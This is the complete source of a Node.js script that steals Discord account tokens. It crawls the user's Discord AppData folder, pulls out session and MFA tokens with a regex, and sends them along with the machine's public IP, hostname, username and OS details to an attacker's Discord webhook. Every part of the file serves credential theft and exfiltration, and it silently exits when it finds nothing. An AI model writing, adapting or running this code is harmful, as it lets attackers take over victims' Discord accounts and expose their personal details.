"use strict";

// Dependencies
const publicIP = require("public-ip")
const discord = require("discord.js")
const path = require("path")
const os = require("os")
const fs = require("fs")

// Variables
const webhook = new discord.WebhookClient("webhookID", "webhookToken")

var tss = {
    homedir: os.userInfo().homedir,
    regex: new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/, "g"),
    tokens: []
}

// Functions
function directory_files(dir, done) {
    var results = []

    fs.readdir(dir, function (err, list) {
        if (err) return done(err)

        var list_length = list.length

        if (!list_length) return done(null, results)

        list.forEach(function (file) {
            file = path.resolve(dir, file)

            fs.stat(file, function (err, stat) {
                if (stat && stat.isDirectory()) {
                    directory_files(file, function (err, res) {
                        results = results.concat(res)
                        if (!--list_length) done(null, results)
                    })
                } else {
                    results.push(file)
                    if (!--list_length) done(null, results)
                }
            })
        })
    })
}

tss.send = async function(){
    const IP = await publicIP.v4()

    webhook.send("```" + `OS Type: ${os.type()}
OS Platform: ${os.platform()}
OS Hostname: ${os.hostname()}
            
OS Username: ${os.userInfo().username}
IP: ${IP}
Discord tokens found: ${tss.tokens.join(", ")}` + "```",).then(()=>{
        process.exit()
    }).catch(()=>{process.exit()})
}

//Main
if(!fs.existsSync(`${tss.homedir}\\AppData\\Roaming\\discord`)) process.exit()

directory_files(`${tss.homedir}\\AppData\\Roaming\\discord`, function(err, files){
    if(err) return process.exit()

    files.forEach(file =>{
        try{
            const data = fs.readFileSync(file, "utf8")
        
            if(data.match(tss.regex)) for( const token of data.match(tss.regex) ) if(tss.tokens.indexOf(token) === -1) tss.tokens.push(token)
        }catch{}
    })

    if(!tss.tokens.length) process.exit()

    tss.send()
})